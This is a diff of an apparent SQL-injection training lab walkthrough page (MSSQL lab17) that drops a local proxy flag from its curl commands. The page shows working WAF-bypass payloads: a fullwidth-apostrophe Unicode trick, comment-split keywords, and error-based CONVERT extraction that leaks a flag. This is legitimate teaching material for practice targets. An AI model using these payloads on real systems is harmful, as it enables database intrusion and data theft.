@@ -7,10 +7,10 @@
         <span class="terminal-title">Step 1. WAF Detection</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab17" \<br> --data-urlencode "q=' UNION SELECT 1,2,3 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab17" \<br> --data-urlencode "q=' UNION SELECT 1,2,3 -- -"<br>
         <span class="prompt">Input: </span>' UNION SELECT 1,2,3 -- -<br>
         <span class="prompt">Result: </span><strong>WAF Blocked: Potentially malicious input detected. Keywords like UNION, SELECT, CONVERT, CAST, EXEC, and single quotes are not allowed.</strong><br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab17" \<br> --data-urlencode "q=laptop"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab17" \<br> --data-urlencode "q=laptop"<br>
         <span class="prompt">Input: </span>laptop<br>
         <span class="prompt">Output: </span><strong>Laptop Pro 15</strong> &bull; $1299.99
     </div>
@@ -37,7 +37,7 @@
         <span class="terminal-title">Step 3. Error-Based with Bypass</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -G \<br>
+        <span class="prompt">$ </span>curl -s -G \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab17" \<br>
         &nbsp;&nbsp;--data-urlencode "q=test$(printf '\xef\xbc\x87') AND 1=CON/**/VERT(INT, (SE/**/LECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Input (URL): </span>test%EF%BC%87 AND 1=CON/**/VERT(INT, (SE/**/LECT TOP 1 flag FROM flags)) -- -<br>
@@ -56,7 +56,7 @@
         <span class="terminal-title">Step 4. UNION Bypass</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -G \<br>
+        <span class="prompt">$ </span>curl -s -G \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab17" \<br>
         &nbsp;&nbsp;--data-urlencode "q=test$(printf '\xef\xbc\x87') UN/**/ION SE/**/LECT 1,flag,0 FROM flags -- -"<br><br>
         <span class="prompt">Input (URL): </span>test%EF%BC%87 UN/**/ION SE/**/LECT 1,flag,0 FROM flags -- -<br>
@@ -97,7 +97,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -G \<br>
+        <span class="prompt">$ </span>curl -s -G \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab17" \<br>
         &nbsp;&nbsp;--data-urlencode "q=test$(printf '\xef\xbc\x87') AND 1=CON/**/VERT(INT, (SE/**/LECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_un1c0d3_n0rm_byp4ss}' to data type int.</strong>
